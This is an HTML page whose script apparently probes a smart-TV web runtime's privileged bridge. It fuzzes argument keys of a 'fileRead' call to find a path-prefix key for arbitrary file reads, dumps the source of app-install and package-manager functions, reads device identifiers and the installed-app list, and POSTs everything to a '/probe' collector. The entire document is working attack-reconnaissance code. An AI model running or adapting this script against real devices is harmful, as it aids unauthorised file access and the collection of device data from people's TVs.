<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>tv fileRead arg hunt</title>
<style>
 body{font:16px/1.3 sans-serif;background:#111;color:#eee;margin:0;padding:16px}
 h1{font-size:18px;margin:0 0 8px}
 #log{white-space:pre-wrap;font-family:monospace;font-size:12px}
 .ok{color:#6f6}.bad{color:#f66}.dim{color:#888}.hit{color:#ff0}
</style>
</head>
<body>
<h1>fileRead: поиск второго аргумента <small class="dim">read-only</small></h1>
<div id="log"></div>
<script>
/* Служба строит путь как "<что-то>/etc/version", где что-то = undefined.
   Подставляем метку MARK в каждый кандидатный ключ и смотрим, появится ли MARK
   в тексте ошибки ENOENT — это имя ключа. Плюс массивы и источники обёрток. */
var API = "";
var hits = [], tests = [], MARK = "ZQMARK";

function log(m, c) {
  var el = document.getElementById("log"), d = document.createElement("div");
  if (c) d.className = c; d.textContent = m; el.appendChild(d);
}
function post(p, o, cb) {
  try { var x = new XMLHttpRequest(); x.open("POST", API + p, true);
    x.setRequestHeader("Content-Type", "application/json");
    x.onreadystatechange = function () { if (x.readyState === 4 && cb) cb(x.status); };
    x.send(JSON.stringify(o)); } catch (e) { if (cb) cb(0); }
}
function call(api, args) {
  try { return window.HiUtils_createRequest(api, args); }
  catch (e) { return { thrown: String(e && e.message || e) }; }
}
function pathOf(r) {
  try { return (r && r.msg && r.msg.path) || JSON.stringify(r).slice(0, 200); }
  catch (e) { return String(r); }
}

/* ---------- A. перебор имён ключа-префикса ---------- */
var KEYS = ["mnt","mount","mountPoint","mount_path","dev","device","devPath","part","partition",
  "root","rootPath","rootDir","basePath","baseUrl","prefix","pre","head","dir","dirname",
  "cwd","home","volume","disk","fs","file","fileName","file_path","name","id","type",
  "sub","parent","from","url","src","uri","location","folderPath","pathPrefix","path_head",
  "mountDir","target","referer","origin","appPath","sysPath","fileDir"];
for (var i = 0; i < KEYS.length; i++) {
  var k = KEYS[i], o = { path: "/etc/version" };
  o[k] = MARK + "/";
  var r = call("fileRead", o), p = pathOf(r);
  var hit = String(p).indexOf(MARK) >= 0;
  tests.push({ key: k, ret: r && r.ret, path: p });
  if (hit) { hits.push(k); log("HIT  " + k + " -> " + p, "hit"); }
}

/* ---------- B. массивы и пустые формы ---------- */
var arrays = [
  ["args=[]", []],
  ["args=[MARK/, path]", [MARK + "/", "/etc/version"]],
  ["args=[path]", ["/etc/version"]],
  ["args=null", null],
  ["args={}", {}],
  ["args=0", 0]
];
for (var j = 0; j < arrays.length; j++) {
  var r2 = call("fileRead", arrays[j][1]), p2 = pathOf(r2);
  var hit2 = String(p2).indexOf(MARK) >= 0;
  tests.push({ form: arrays[j][0], ret: r2 && r2.ret, path: p2 });
  log((hit2 ? "HIT  " : "     ") + arrays[j][0] + " -> " + p2, hit2 ? "hit" : "dim");
  if (hit2) hits.push(arrays[j][0]);
}

/* ---------- C. источники обёрток store / tvinfo ---------- */
var srcs = {};
function grab(obj, names) {
  if (!obj) return;
  for (var n = 0; n < names.length; n++) {
    try { srcs[names[n]] = Function.prototype.toString.call(obj[names[n]]).slice(0, 400); }
    catch (e) { srcs[names[n]] = "err:" + e; }
  }
}
grab(window.vowOS && window.vowOS.store, ["getInstalledPkgs","installApp","sendPkgmgrRequest"]);
grab(window.vowOS && window.vowOS.tvinfo, ["getChipId","getStoreMode","getHotelMode","getPanelType","setBrightness"]);

/* ---------- D. чтения без записи ---------- */
var reads = {};
function tryRead(label, fn) {
  try { reads[label] = JSON.stringify(fn()).slice(0, 300); }
  catch (e) { reads[label] = "err:" + (e && e.message || e); }
}
tryRead("tvinfo.getOSVersion", function () { return window.vowOS.tvinfo.getOSVersion(); });
tryRead("tvinfo.getChipId", function () { return window.vowOS.tvinfo.getChipId(); });
tryRead("tvinfo.getPanelType", function () { return window.vowOS.tvinfo.getPanelType(); });
tryRead("tvinfo.getStoreMode", function () { return window.vowOS.tvinfo.getStoreMode(); });
tryRead("tvinfo.getHotelMode", function () { return window.vowOS.tvinfo.getHotelMode(); });
tryRead("tvinfo.getUIVersion", function () { return window.vowOS.tvinfo.getUIVersion(); });
tryRead("store.getInstalledPkgs", function () { return window.vowOS.store.getInstalledPkgs(); });
for (var kk in reads) log(kk + " -> " + reads[kk], "dim");

post("/probe", { name: "arghunt", userAgent: navigator.userAgent, hits: hits, tests: tests, sources: srcs, reads: reads }, function (st) {
  log(st === 200 ? "готово: отправлено" : "ошибка отправки " + st, st === 200 ? "ok" : "bad");
});
</script>
</body>
</html>
